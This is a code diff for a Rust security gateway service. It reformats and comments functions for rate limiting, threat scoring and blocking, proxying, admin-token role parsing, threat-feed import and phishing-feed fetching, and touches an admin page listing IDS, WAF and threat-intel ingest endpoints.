-async fn events_ndjson(State(state): State<AppState>) -> Response { let data = state.inner.read().await; events_ndjson_response(export_events_ndjson(&data.events)) }
-fn events_ndjson_response(export: Result<String, serde_json::Error>) -> Response { match export { Ok(body) => (StatusCode::OK, [("content-type", "application/x-ndjson; charset=utf-8")], body).into_response(), Err(err) => error(StatusCode::INTERNAL_SERVER_ERROR, format!("failed to serialize security events: {err}")) } }
-async fn dnsbl_zone(State(state): State<AppState>) -> impl IntoResponse { let data = state.inner.read().await; (StatusCode::OK, [("content-type", "text/plain; charset=utf-8")], export_dnsbl_zone(&state.dnsbl_origin, &data.dnsbl)) }
+async fn events_ndjson(State(state): State<AppState>) -> Response {
+    let data = state.inner.read().await;
+    events_ndjson_response(export_events_ndjson(&data.events))
+}
 
-async fn gateway(State(state): State<AppState>, method: Method, uri: Uri, headers: HeaderMap, body: Bytes) -> Response {
-    let gateway_path = uri.path().strip_prefix("/gateway").filter(|path| !path.is_empty()).unwrap_or("/");
-    let (route, threats, dnsbl) = { let data = state.inner.read().await; let Some(route) = select_route(&data.routes, gateway_path) else { return error(StatusCode::NOT_FOUND, "no gateway route matched the request path"); }; (route.clone(), data.threats.clone(), data.dnsbl.clone()) };
+fn events_ndjson_response(export: Result<String, serde_json::Error>) -> Response {
+    match export {
+        Ok(body) => (
+            StatusCode::OK,
+            [("content-type", "application/x-ndjson; charset=utf-8")],
+            body,
+        )
+            .into_response(),
+        Err(err) => error(
+            StatusCode::INTERNAL_SERVER_ERROR,
+            format!("failed to serialize security events: {err}"),
+        ),
+    }
+}
+
+async fn dnsbl_zone(State(state): State<AppState>) -> impl IntoResponse {
+    let data = state.inner.read().await;
+    (
+        StatusCode::OK,
+        [("content-type", "text/plain; charset=utf-8")],
+        export_dnsbl_zone(&state.dnsbl_origin, &data.dnsbl),
+    )
+}
+
+async fn gateway(
+    State(state): State<AppState>,
+    method: Method,
+    uri: Uri,
+    headers: HeaderMap,
+    body: Bytes,
+) -> Response {
+    let gateway_path = uri
+        .path()
+        .strip_prefix("/gateway")
+        .filter(|path| !path.is_empty())
+        .unwrap_or("/");
+
+    let (route, threats, dnsbl) = {
+        let data = state.inner.read().await;
+        let Some(route) = select_route(&data.routes, gateway_path) else {
+            return error(
+                StatusCode::NOT_FOUND,
+                "no gateway route matched the request path",
+            );
+        };
+        (route.clone(), data.threats.clone(), data.dnsbl.clone())
+    };
+
     let client_ip = client_ip_from_headers(&headers);
-    if !state.allow_request(client_ip).await { record_event(&state, client_ip, Some(route.id.clone()), "rate_limited", format!("rate limit exceeded ({} requests per {}s)", state.rate_limit, state.rate_limit_window), 0, gateway_path).await; return (StatusCode::TOO_MANY_REQUESTS, Json(serde_json::json!({"action":"rate_limited","route_id":route.id,"limit":state.rate_limit,"window_seconds":state.rate_limit_window}))).into_response(); }
-    let body_text = String::from_utf8_lossy(&body); let scored = score_request(gateway_path, uri.query(), &body_text, client_ip, &threats, &dnsbl);
-    if route.mode == EnforcementMode::Block && scored.score >= route.block_threshold.unwrap_or(BLOCK_SCORE) { record_event(&state, client_ip, Some(route.id.clone()), "blocked", scored.reason.clone(), scored.score, gateway_path).await; return (StatusCode::FORBIDDEN, Json(serde_json::json!({"action":"blocked","route_id":route.id,"score":scored.score,"reason":scored.reason}))).into_response(); }
-    record_event(&state, client_ip, Some(route.id.clone()), "monitored", scored.reason.clone(), scored.score, gateway_path).await;
-    if route.upstream.starts_with("mock://") { return (StatusCode::OK, Json(serde_json::json!({"action":"monitored","route_id":route.id,"method":method.as_str(),"path":gateway_path,"score":scored.score,"reason":scored.reason,"upstream":route.upstream}))).into_response(); }
-    match proxy_request(&state, &route, &method, gateway_path, uri.query(), body).await { Ok(response) => response, Err(message) => error(StatusCode::BAD_GATEWAY, message) }
+
+    // Rate limiting runs before scoring/proxying so floods are shed cheaply.
+    if !state.allow_request(client_ip).await {
+        record_event(
+            &state,
+            client_ip,
+            Some(route.id.clone()),
+            "rate_limited",
+            format!(
+                "rate limit exceeded ({} requests per {}s)",
+                state.rate_limit, state.rate_limit_window
+            ),
+            0,
+            gateway_path,
+        )
+        .await;
+        return (
+            StatusCode::TOO_MANY_REQUESTS,
+            Json(serde_json::json!({
+                "action": "rate_limited",
+                "route_id": route.id,
+                "limit": state.rate_limit,
+                "window_seconds": state.rate_limit_window
+            })),
+        )
+            .into_response();
+    }
+
+    let body_text = String::from_utf8_lossy(&body);
+    let scored = score_request(
+        gateway_path,
+        uri.query(),
+        &body_text,
+        client_ip,
+        &threats,
+        &dnsbl,
+    );
+
+    if route.mode == EnforcementMode::Block
+        && scored.score >= route.block_threshold.unwrap_or(BLOCK_SCORE)
+    {
+        record_event(
+            &state,
+            client_ip,
+            Some(route.id.clone()),
+            "blocked",
+            scored.reason.clone(),
+            scored.score,
+            gateway_path,
+        )
+        .await;
+        return (
+            StatusCode::FORBIDDEN,
+            Json(serde_json::json!({
+                "action": "blocked",
+                "route_id": route.id,
+                "score": scored.score,
+                "reason": scored.reason
+            })),
+        )
+            .into_response();
+    }
+
+    record_event(
+        &state,
+        client_ip,
+        Some(route.id.clone()),
+        "monitored",
+        scored.reason.clone(),
+        scored.score,
+        gateway_path,
+    )
+    .await;
+
+    if route.upstream.starts_with("mock://") {
+        return (
+            StatusCode::OK,
+            Json(serde_json::json!({
+                "action": "monitored",
+                "route_id": route.id,
+                "method": method.as_str(),
+                "path": gateway_path,
+                "score": scored.score,
+                "reason": scored.reason,
+                "upstream": route.upstream
+            })),
+        )
+            .into_response();
+    }
+
+    match proxy_request(&state, &route, &method, gateway_path, uri.query(), body).await {
+        Ok(response) => response,
+        Err(message) => error(StatusCode::BAD_GATEWAY, message),
+    }
 }
 
-fn client_ip_from_headers(headers: &HeaderMap) -> Option<IpAddr> { headers.get("x-forwarded-for").and_then(|value| value.to_str().ok()).and_then(|value| value.split(',').next()).map(str::trim).or_else(|| headers.get("x-real-ip").and_then(|value| value.to_str().ok())).and_then(|value| value.parse().ok()) }
-
-async fn proxy_request(state: &AppState, route: &RouteConfig, method: &Method, path: &str, query: Option<&str>, body: Bytes) -> Result<Response, String> {
-    let target = upstream_target(route, path, query)?; let method = reqwest::Method::from_bytes(method.as_str().as_bytes()).expect("axum HTTP methods are valid reqwest HTTP methods"); let response = state.http.request(method, target).body(body).send().await.map_err(|error| format!("upstream request failed: {error}"))?; let status = StatusCode::from_u16(response.status().as_u16()).expect("reqwest upstream status codes are valid axum status codes"); let bytes = response.bytes().await.map_err(|error| format!("upstream body read failed: {error}"))?; Ok((status, bytes).into_response())
+fn client_ip_from_headers(headers: &HeaderMap) -> Option<IpAddr> {
+    headers
+        .get("x-forwarded-for")
+        .and_then(|value| value.to_str().ok())
+        .and_then(|value| value.split(',').next())
+        .map(str::trim)
+        .or_else(|| {
+            headers
+                .get("x-real-ip")
+                .and_then(|value| value.to_str().ok())
+        })
+        .and_then(|value| value.parse().ok())
 }
 
-pub fn upstream_target(route: &RouteConfig, path: &str, query: Option<&str>) -> Result<String, String> {
-    if !route.upstream.starts_with("http://") && !route.upstream.starts_with("https://") { return Err("upstream must use http:// or https:// for proxy mode".to_string()); }
-    let suffix = path.strip_prefix(&route.path_prefix).unwrap_or(path); let suffix = if suffix.starts_with('/') { suffix.to_string() } else if suffix.is_empty() { "/".to_string() } else { format!("/{suffix}") }; let mut target = format!("{}{}", route.upstream.trim_end_matches('/'), suffix); if let Some(query) = query.filter(|value| !value.is_empty()) { target.push('?'); target.push_str(query); } Ok(target)
+async fn proxy_request(
+    state: &AppState,
+    route: &RouteConfig,
+    method: &Method,
+    path: &str,
+    query: Option<&str>,
+    body: Bytes,
+) -> Result<Response, String> {
+    let target = upstream_target(route, path, query)?;
+    let method = reqwest::Method::from_bytes(method.as_str().as_bytes())
+        .expect("axum HTTP methods are valid reqwest HTTP methods");
+    let response = state
+        .http
+        .request(method, target)
+        .body(body)
+        .send()
+        .await
+        .map_err(|error| format!("upstream request failed: {error}"))?;
+    let status = StatusCode::from_u16(response.status().as_u16())
+        .expect("reqwest upstream status codes are valid axum status codes");
+    let bytes = response
+        .bytes()
+        .await
+        .map_err(|error| format!("upstream body read failed: {error}"))?;
+    Ok((status, bytes).into_response())
 }
 
-async fn record_event(state: &AppState, client_ip: Option<IpAddr>, route_id: Option<String>, action: &str, reason: String, score: u16, path: &str) {
-    let action = action.to_string(); let path = path.to_string(); let event_limit = state.event_limit;
-    if let Err(error) = state.mutate_and_persist(|data| { let id = data.next_event_id; data.next_event_id += 1; let event = SecurityEvent { id, timestamp_unix: now_unix(), client_ip, route_id, action, reason, score, path }; println!("{}", security_event_log_line(&event)); data.events.push(event); enforce_event_limit(data, event_limit); }).await { eprintln!("failed to persist security event: {error}"); }
+pub fn upstream_target(
+    route: &RouteConfig,
+    path: &str,
+    query: Option<&str>,
+) -> Result<String, String> {
+    if !route.upstream.starts_with("http://") && !route.upstream.starts_with("https://") {
+        return Err("upstream must use http:// or https:// for proxy mode".to_string());
+    }
+    let suffix = path.strip_prefix(&route.path_prefix).unwrap_or(path);
+    let suffix = if suffix.starts_with('/') {
+        suffix.to_string()
+    } else if suffix.is_empty() {
+        "/".to_string()
+    } else {
+        format!("/{suffix}")
+    };
+    let mut target = format!("{}{}", route.upstream.trim_end_matches('/'), suffix);
+    if let Some(query) = query.filter(|value| !value.is_empty()) {
+        target.push('?');
+        target.push_str(query);
+    }
+    Ok(target)
 }
 
-fn security_event_log_line(event: &SecurityEvent) -> String { serde_json::to_string(event).expect("SecurityEvent is JSON-serializable") }
+async fn record_event(
+    state: &AppState,
+    client_ip: Option<IpAddr>,
+    route_id: Option<String>,
+    action: &str,
+    reason: String,
+    score: u16,
+    path: &str,
+) {
+    let action = action.to_string();
+    let path = path.to_string();
+    let event_limit = state.event_limit;
+    if let Err(error) = state
+        .mutate_and_persist(|data| {
+            let id = data.next_event_id;
+            data.next_event_id += 1;
+            let event = SecurityEvent {
+                id,
+                timestamp_unix: now_unix(),
+                client_ip,
+                route_id,
+                action,
+                reason,
+                score,
+                path,
+            };
+            // Structured stdout log line for SIEM / log-collector ingestion.
+            // ponytail: one println per recorded event — fine at gateway volumes;
+            // add async batching if event throughput ever becomes a bottleneck.
+            println!("{}", security_event_log_line(&event));
+            data.events.push(event);
+            enforce_event_limit(data, event_limit);
+        })
+        .await
+    {
+        eprintln!("failed to persist security event: {error}");
+    }
+}
 
+/// Serializes a [`SecurityEvent`] as a single-line JSON record for structured
+/// stdout logging (SIEM / log-collector ingestion).
+fn security_event_log_line(event: &SecurityEvent) -> String {
+    serde_json::to_string(event).expect("SecurityEvent is JSON-serializable")
+}
+
+/// RBAC principal bound to an admin token.
 #[derive(Debug, Clone, PartialEq, Eq)]
-pub struct AdminPrincipal { pub actor: String, pub can_write: bool }
+pub struct AdminPrincipal {
+    pub actor: String,
+    /// When false, the token may authenticate for read-only operator surfaces
+    /// (e.g. audit logs) but cannot perform management writes.
+    pub can_write: bool,
+}
 
+/// True when the request presents a valid admin credential (write or readonly).
+/// When no admin credentials are configured, returns true (auth disabled).
 fn admin_authenticated(state: &AppState, headers: &HeaderMap) -> bool {
-    let presented = headers.get("x-admin-token").and_then(|value| value.to_str().ok()); if !state.admin_tokens.is_empty() { return presented.is_some_and(|token| state.admin_tokens.contains_key(token)); } let Some(expected) = state.admin_token.as_deref() else { return true; }; presented.is_some_and(|actual| actual == expected)
+    let presented = headers
+        .get("x-admin-token")
+        .and_then(|value| value.to_str().ok());
+    if !state.admin_tokens.is_empty() {
+        return presented.is_some_and(|token| state.admin_tokens.contains_key(token));
+    }
+    let Some(expected) = state.admin_token.as_deref() else {
+        return true;
+    };
+    presented.is_some_and(|actual| actual == expected)
 }
+
+/// True when the request may perform management **writes**.
+/// Readonly RBAC tokens authenticate but cannot write.
 fn admin_authorized(state: &AppState, headers: &HeaderMap) -> bool {
-    let presented = headers.get("x-admin-token").and_then(|value| value.to_str().ok()); if !state.admin_tokens.is_empty() { return presented.is_some_and(|token| state.admin_tokens.get(token).is_some_and(|principal| principal.can_write)); } let Some(expected) = state.admin_token.as_deref() else { return true; }; presented.is_some_and(|actual| actual == expected)
+    let presented = headers
+        .get("x-admin-token")
+        .and_then(|value| value.to_str().ok());
+    // RBAC tokens take precedence when configured.
+    if !state.admin_tokens.is_empty() {
+        return presented.is_some_and(|token| {
+            state
+                .admin_tokens
+                .get(token)
+                .is_some_and(|principal| principal.can_write)
+        });
+    }
+    // Fallback: single shared token (None means auth is disabled).
+    let Some(expected) = state.admin_token.as_deref() else {
+        return true;
+    };
+    presented.is_some_and(|actual| actual == expected)
 }
-fn has_write_admin_credential(state: &AppState) -> bool { if !state.admin_tokens.is_empty() { return state.admin_tokens.values().any(|principal| principal.can_write); } state.admin_token.as_deref().is_some_and(|token| !token.is_empty()) }
-fn audit_actor(state: &AppState, headers: &HeaderMap) -> String { if let Some(actor) = state.actor_for_token(headers) { return actor; } headers.get("x-admin-actor").and_then(|value| value.to_str().ok()).map(str::trim).filter(|value| !value.is_empty()).unwrap_or("admin-token").to_string() }
 
+fn has_write_admin_credential(state: &AppState) -> bool {
+    if !state.admin_tokens.is_empty() {
+        return state
+            .admin_tokens
+            .values()
+            .any(|principal| principal.can_write);
+    }
+    state
+        .admin_token
+        .as_deref()
+        .is_some_and(|token| !token.is_empty())
+}
+
+fn audit_actor(state: &AppState, headers: &HeaderMap) -> String {
+    // Prefer the actor bound to the presented RBAC token, then an explicit
+    // actor header, then a generic label. The token itself is never logged.
+    if let Some(actor) = state.actor_for_token(headers) {
+        return actor;
+    }
+    headers
+        .get("x-admin-actor")
+        .and_then(|value| value.to_str().ok())
+        .map(str::trim)
+        .filter(|value| !value.is_empty())
+        .unwrap_or("admin-token")
+        .to_string()
+}
+
+/// Parses an `ADMIN_TOKENS` string into a token -> [`AdminPrincipal`] map.
+///
+/// Format is comma-separated items:
+/// - `token` → actor `admin`, write enabled
+/// - `token:actor` → named actor, write enabled
+/// - `token:actor:readonly` (or `:read`) → named actor, write **disabled**
+/// - `token:actor:admin` / `:write` / `:writer` → named actor, write enabled
+///
+/// Blank items and blank tokens are ignored. Unknown role labels default to
+/// write-enabled so legacy `token:actor` configs keep full access.
 pub fn parse_admin_tokens(raw: &str) -> HashMap<String, AdminPrincipal> {
-    raw.split(',').filter_map(|item| { let item = item.trim(); if item.is_empty() { return None; } let mut parts = item.splitn(3, ':').map(str::trim); let token = parts.next().unwrap_or(""); if token.is_empty() { return None; } let actor_raw = parts.next().unwrap_or(""); let role_raw = parts.next().unwrap_or(""); let actor = if actor_raw.is_empty() { "admin".to_string() } else { actor_raw.to_string() }; if actor.is_empty() { return None; } let can_write = match role_raw.to_ascii_lowercase().as_str() { "" | "admin" | "write" | "writer" | "operator" => true, "readonly" | "read" | "reader" | "ro" => false, _ => true }; Some((token.to_string(), AdminPrincipal { actor, can_write })) }).collect()
+    raw.split(',')
+        .filter_map(|item| {
+            let item = item.trim();
+            if item.is_empty() {
+                return None;
+            }
+            let mut parts = item.splitn(3, ':').map(str::trim);
+            let token = parts.next().unwrap_or("");
+            if token.is_empty() {
+                return None;
+            }
+            let actor_raw = parts.next().unwrap_or("");
+            let role_raw = parts.next().unwrap_or("");
+            let actor = if actor_raw.is_empty() {
+                "admin".to_string()
+            } else {
+                actor_raw.to_string()
+            };
+            if actor.is_empty() {
+                return None;
+            }
+            let can_write = match role_raw.to_ascii_lowercase().as_str() {
+                "" | "admin" | "write" | "writer" | "operator" => true,
+                "readonly" | "read" | "reader" | "ro" => false,
+                // Unknown role: fail open to write so mis-typed labels do not
+                // silently strand operators without recovery — document known roles.
+                _ => true,
+            };
+            Some((token.to_string(), AdminPrincipal { actor, can_write }))
+        })
+        .collect()
 }
 
-fn record_successful_audit_log(data: &mut AppData, actor: String, action: &str, resource: &str, resource_id: String) -> AuditLogEntry { record_audit_log(data, NewAuditLogEntry { timestamp_unix: now_unix(), actor, action: action.to_string(), resource: resource.to_string(), resource_id, outcome: "success".to_string() }) }
-fn threat_resource_id(indicator: &ThreatIndicator) -> String { format!("{}:{}:{}", indicator.indicator_type, indicator.value, indicator.source) }
-fn mark_operator_threat_key(data: &mut AppData, indicator: &ThreatIndicator) { let key = threat_indicator_key(indicator); if !data.operator_threat_keys.contains(&key) { data.operator_threat_keys.push(key); } }
+fn record_successful_audit_log(
+    data: &mut AppData,
+    actor: String,
+    action: &str,
+    resource: &str,
+    resource_id: String,
+) -> AuditLogEntry {
+    record_audit_log(
+        data,
+        NewAuditLogEntry {
+            timestamp_unix: now_unix(),
+            actor,
+            action: action.to_string(),
+            resource: resource.to_string(),
+            resource_id,
+            outcome: "success".to_string(),
+        },
+    )
+}
 
-async fn apply_threat_feed_import(state: &AppState, actor: String, action: &'static str, feed: ThreatFeedImport) -> Result<ThreatFeedImportResult, String> {
-    let imported_at = now_unix(); state.mutate_and_persist(|data| {
-        let operator_owned: HashSet<_> = data.operator_threat_keys.iter().cloned().collect(); let threat_keys: Vec<_> = feed.threats.iter().map(threat_indicator_key).collect(); let previous_keys: HashSet<_> = replace_threat_feed_ownership(&mut data.threat_feed_ownership, feed.feed_id.clone(), threat_keys).into_iter().collect();
-        if !previous_keys.is_empty() { let still_owned: HashSet<_> = data.threat_feed_ownership.iter().filter(|ownership| ownership.feed_id != feed.feed_id).flat_map(|ownership| ownership.threat_keys.iter().cloned()).collect(); data.threats.retain(|threat| { let key = threat_indicator_key(threat); !previous_keys.contains(&key) || still_owned.contains(&key) || operator_owned.contains(&key) }); }
-        let mut upserted_threats = 0usize; for threat in feed.threats.iter().cloned() { if operator_owned.contains(&threat_indicator_key(&threat)) { continue; } upsert_threat(&mut data.threats, threat); upserted_threats += 1; }
-        for entry in feed.dnsbl.iter().cloned() { upsert_dnsbl(&mut data.dnsbl, entry); }
-        upsert_threat_feed(&mut data.threat_feeds, ThreatFeedStatus { feed_id: feed.feed_id.clone(), source: feed.source.clone(), last_updated_unix: imported_at, threat_count: feed.threats.len(), dnsbl_count: feed.dnsbl.len(), ttl_seconds: feed.ttl_seconds });
-        let result = ThreatFeedImportResult { feed_id: feed.feed_id.clone(), upserted_threats, upserted_dnsbl: feed.dnsbl.len(), last_updated_unix: imported_at }; record_successful_audit_log(data, actor, action, "threat_feed", result.feed_id.clone()); result
-    }).await
+fn threat_resource_id(indicator: &ThreatIndicator) -> String {
+    format!(
+        "{}:{}:{}",
+        indicator.indicator_type, indicator.value, indicator.source
+    )
+}
+
+fn mark_operator_threat_key(data: &mut AppData, indicator: &ThreatIndicator) {
+    let key = threat_indicator_key(indicator);
+    if !data.operator_threat_keys.contains(&key) {
+        data.operator_threat_keys.push(key);
+    }
+}
+
+async fn apply_threat_feed_import(
+    state: &AppState,
+    actor: String,
+    action: &'static str,
+    feed: ThreatFeedImport,
+) -> Result<ThreatFeedImportResult, String> {
+    let imported_at = now_unix();
+    state
+        .mutate_and_persist(|data| {
+            let operator_owned: HashSet<_> = data.operator_threat_keys.iter().cloned().collect();
+            let threat_keys: Vec<_> = feed.threats.iter().map(threat_indicator_key).collect();
+            let previous_keys: HashSet<_> = replace_threat_feed_ownership(
+                &mut data.threat_feed_ownership,
+                feed.feed_id.clone(),
+                threat_keys,
+            )
+            .into_iter()
+            .collect();
+            if !previous_keys.is_empty() {
+                // A key this feed is dropping might still be owned by another
+                // feed (e.g. two feeds importing the same CVE under a shared
+                // `source`) -- only reap it once no feed's ownership record
+                // claims it any more, so a refresh on one feed can't make a
+                // still-relevant indicator vanish from enforcement. Also keep
+                // indicators an operator independently upserted via /api/threats.
+                let still_owned: HashSet<_> = data
+                    .threat_feed_ownership
+                    .iter()
+                    .filter(|ownership| ownership.feed_id != feed.feed_id)
+                    .flat_map(|ownership| ownership.threat_keys.iter().cloned())
+                    .collect();
+                data.threats.retain(|threat| {
+                    let key = threat_indicator_key(threat);
+                    !previous_keys.contains(&key)
+                        || still_owned.contains(&key)
+                        || operator_owned.contains(&key)
+                });
+            }
+            let mut upserted_threats = 0usize;
+            for threat in feed.threats.iter().cloned() {
+                if operator_owned.contains(&threat_indicator_key(&threat)) {
+                    continue;
+                }
+                upsert_threat(&mut data.threats, threat);
+                upserted_threats += 1;
+            }
+            for entry in feed.dnsbl.iter().cloned() {
+                upsert_dnsbl(&mut data.dnsbl, entry);
+            }
+            upsert_threat_feed(
+                &mut data.threat_feeds,
+                ThreatFeedStatus {
+                    feed_id: feed.feed_id.clone(),
+                    source: feed.source.clone(),
+                    last_updated_unix: imported_at,
+                    threat_count: feed.threats.len(),
+                    dnsbl_count: feed.dnsbl.len(),
+                    ttl_seconds: feed.ttl_seconds,
+                },
+            );
+            let result = ThreatFeedImportResult {
+                feed_id: feed.feed_id.clone(),
+                upserted_threats,
+                upserted_dnsbl: feed.dnsbl.len(),
+                last_updated_unix: imported_at,
+            };
+            record_successful_audit_log(data, actor, action, "threat_feed", result.feed_id.clone());
+            result
+        })
+        .await
 }
 
 async fn fetch_text_feed(state: &AppState, url: &str) -> Result<String, String> {
-    use futures_util::StreamExt; validate_http_url(url, true).map_err(|message| format!("invalid feed URL {url}: {message}"))?; let response = state.feed_http.get(url).timeout(std::time::Duration::from_secs(PHISHING_DATABASE_FETCH_TIMEOUT_SECS)).send().await.map_err(|error| format!("failed to fetch feed {url}: {error}"))?; let status = response.status(); if !status.is_success() { return Err(format!("feed {url} returned HTTP {status}")); } if let Some(len) = response.content_length() && len as usize > PHISHING_DATABASE_MAX_BODY_BYTES { return Err(format!("feed {url} body too large: {len} bytes (limit: {PHISHING_DATABASE_MAX_BODY_BYTES})")); } let mut bytes = Vec::new(); let mut stream = response.bytes_stream(); while let Some(chunk) = stream.next().await { let chunk = chunk.map_err(|error| format!("failed to read feed body from {url}: {error}"))?; if bytes.len().saturating_add(chunk.len()) > PHISHING_DATABASE_MAX_BODY_BYTES { return Err(format!("feed {url} body too large: limit {PHISHING_DATABASE_MAX_BODY_BYTES} bytes exceeded while streaming")); } bytes.extend_from_slice(&chunk); } String::from_utf8(bytes).map_err(|error| format!("feed {url} is not valid UTF-8 text: {error}"))
+    use futures_util::StreamExt;
+
+    validate_http_url(url, /* allow_non_default_hosts */ true)
+        .map_err(|message| format!("invalid feed URL {url}: {message}"))?;
+    let response = state
+        .feed_http
+        .get(url)
+        .timeout(std::time::Duration::from_secs(
+            PHISHING_DATABASE_FETCH_TIMEOUT_SECS,
+        ))
+        .send()
+        .await
+        .map_err(|error| format!("failed to fetch feed {url}: {error}"))?;
+    let status = response.status();
+    if !status.is_success() {
+        return Err(format!("feed {url} returned HTTP {status}"));
+    }
+    // Fail fast when the server advertises an oversized Content-Length.
+    if let Some(len) = response.content_length()
+        && len as usize > PHISHING_DATABASE_MAX_BODY_BYTES
+    {
+        return Err(format!(
+            "feed {url} body too large: {len} bytes (limit: {PHISHING_DATABASE_MAX_BODY_BYTES})"
+        ));
+    }
+    // Stream chunks so a chunked/malicious body cannot OOM the process before the cap.
+    let mut bytes = Vec::new();
+    let mut stream = response.bytes_stream();
+    while let Some(chunk) = stream.next().await {
+        let chunk =
+            chunk.map_err(|error| format!("failed to read feed body from {url}: {error}"))?;
+        if bytes.len().saturating_add(chunk.len()) > PHISHING_DATABASE_MAX_BODY_BYTES {
+            return Err(format!(
+                "feed {url} body too large: limit {PHISHING_DATABASE_MAX_BODY_BYTES} bytes exceeded while streaming"
+            ));
+        }
+        bytes.extend_from_slice(&chunk);
+    }
+    String::from_utf8(bytes).map_err(|error| format!("feed {url} is not valid UTF-8 text: {error}"))
 }
 
-fn parse_phishing_domains(feed: &str, limit: usize) -> Vec<String> { let mut values = Vec::new(); let mut unique = HashSet::new(); for line in feed.lines() { let Some(domain) = normalize_phishing_domain(line) else { continue; }; if unique.insert(domain.clone()) { values.push(domain); if values.len() >= limit { break; } } } values }
-fn normalize_phishing_domain(value: &str) -> Option<String> { let trimmed = value.trim(); if trimmed.is_empty() || trimmed.starts_with('#') { return None; } let without_scheme = trimmed.strip_prefix("https://").or_else(|| trimmed.strip_prefix("http://")).unwrap_or(trimmed); let host_port = without_scheme.split('/').next().unwrap_or(""); let host = host_port.split(':').next().unwrap_or("").trim_end_matches('.'); if host.is_empty() || !host.contains('.') || host.starts_with('.') || host.contains("..") { return None; } if host.parse::<IpAddr>().is_ok() { return None; } if !host.bytes().all(|byte| byte.is_ascii_alphanumeric() || byte == b'.' || byte == b'-') { return None; } Some(host.to_ascii_lowercase()) }
-fn parse_phishing_ips(feed: &str, limit: usize) -> Vec<IpAddr> { let mut values = Vec::new(); let mut unique = HashSet::new(); for line in feed.lines() { let trimmed = line.trim(); if trimmed.is_empty() || trimmed.starts_with('#') { continue; } let Ok(address) = trimmed.parse::<IpAddr>() else { continue; }; if unique.insert(address) { values.push(address); if values.len() >= limit { break; } } } values }
-fn error(status: StatusCode, message: impl Into<String>) -> Response { (status, Json(ErrorBody { error: message.into() })).into_response() }
-fn now_unix() -> u64 { SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs() }
+fn parse_phishing_domains(feed: &str, limit: usize) -> Vec<String> {
+    let mut values = Vec::new();
+    let mut unique = HashSet::new();
+    for line in feed.lines() {
+        let Some(domain) = normalize_phishing_domain(line) else {
+            continue;
+        };
+        if unique.insert(domain.clone()) {
+            values.push(domain);
+            if values.len() >= limit {
+                break;
+            }
+        }
+    }
+    values
+}
+
+fn normalize_phishing_domain(value: &str) -> Option<String> {
+    let trimmed = value.trim();
+    if trimmed.is_empty() || trimmed.starts_with('#') {
+        return None;
+    }
+    let without_scheme = trimmed
+        .strip_prefix("https://")
+        .or_else(|| trimmed.strip_prefix("http://"))
+        .unwrap_or(trimmed);
+    let host_port = without_scheme.split('/').next().unwrap_or("");
+    let host = host_port
+        .split(':')
+        .next()
+        .unwrap_or("")
+        .trim_end_matches('.');
+    if host.is_empty() || !host.contains('.') || host.starts_with('.') || host.contains("..") {
+        return None;
+    }
+    if host.parse::<IpAddr>().is_ok() {
+        return None;
+    }
+    if !host
+        .bytes()
+        .all(|byte| byte.is_ascii_alphanumeric() || byte == b'.' || byte == b'-')
+    {
+        return None;
+    }
+    Some(host.to_ascii_lowercase())
+}
+
+fn parse_phishing_ips(feed: &str, limit: usize) -> Vec<IpAddr> {
+    let mut values = Vec::new();
+    let mut unique = HashSet::new();
+    for line in feed.lines() {
+        let trimmed = line.trim();
+        if trimmed.is_empty() || trimmed.starts_with('#') {
+            continue;
+        }
+        let Ok(address) = trimmed.parse::<IpAddr>() else {
+            continue;
+        };
+        if unique.insert(address) {
+            values.push(address);
+            if values.len() >= limit {
+                break;
+            }
+        }
+    }
+    values
+}
+
+fn error(status: StatusCode, message: impl Into<String>) -> Response {
+    (
+        status,
+        Json(ErrorBody {
+            error: message.into(),
+        }),
+    )
+        .into_response()
+}
+
+fn now_unix() -> u64 {
+    SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs()
+}
 
 const ADMIN_HTML: &str = r##"<!doctype html>
 <html lang="en">
@@ -1516,7 +2925,7 @@ const ADMIN_HTML: &str = r##"<!doctype html>
 body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:var(--canvas);color:var(--ink);font-size:var(--fs-body);line-height:1.5}
 a.skip{position:absolute;left:-9999px;top:0;background:var(--brand);color:var(--on-brand);padding:10px 16px;z-index:30;border-radius:0 0 6px 0}
 a.skip:focus{left:0}
-header.app{display:flex;align-items:center;flex-wrap:wrap;gap:16px;padding:16px 24px;background:var(--brand);color:var(--on-brand)}
+header.app{display:flex;align-items:center;gap:16px;padding:16px 24px;background:var(--brand);color:var(--on-brand)}
 header.app h1{font-size:var(--fs-h1);margin:0;font-weight:600;flex:1}
 .toolbar{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
 .hdr-input{min-height:44px;border-radius:6px;border:1px solid rgba(255,255,255,.5);background:rgba(255,255,255,.12);color:var(--on-brand);padding:0 12px;font:inherit;width:200px}
@@ -1652,18 +3061,47 @@ input,select{font:inherit;min-height:44px;padding:0 12px;border:1px solid var(--
     </section>
     <section class="card"><h2>Threat feeds</h2><div id="feedsBody" class="muted">Loading…</div></section>
     <section class="card" id="eventsCard" aria-labelledby="eventsHeading"><h2 id="eventsHeading">Recent events</h2><div id="eventsBody" class="muted">Loading…</div></section>
-    <section class="card"><h2>Suricata IDS ingest</h2><p class="muted">POST admin-authenticated Suricata EVE JSON/NDJSON alerts to <code>/api/ids/suricata/eve</code>. Alerts become SOC security events (no hand-rolled IDS rules).</p></section>
-    <section class="card"><h2>Coraza / OWASP CRS WAF ingest</h2><p class="muted">POST admin-authenticated Coraza audit JSON/NDJSON to <code>/api/waf/coraza/audit</code>. CRS rule matches become SOC events and block-grade hits also seed DNSBL/<code>client_ip</code> indicators so the gateway enforces subsequent requests (run Coraza outside; do not invent WAF rules here).</p></section>
-    <section class="card"><h2>STIX threat intelligence</h2><p class="muted">POST admin-authenticated STIX 2.x indicator or bundle JSON to <code>/api/threat-intel/stix</code> (optional query: <code>feed_id</code>, <code>source</code>, <code>ttl_seconds</code>). Maps ipv4/domain/url patterns into threats/DNSBL for gateway scoring.</p></section>
-    <section class="card"><h2>MISP threat intelligence</h2><p class="muted">POST admin-authenticated MISP Event/attribute JSON to <code>/api/threat-intel/misp</code> (optional query: <code>feed_id</code>, <code>source</code>, <code>ttl_seconds</code>). Maps IDS-worthy attributes (ip-src/ip-dst, domain, url, composites, hashes) into threats/DNSBL; attributes with <code>to_ids=false</code> are skipped. Live MISP REST pull is a follow-up.</p></section>
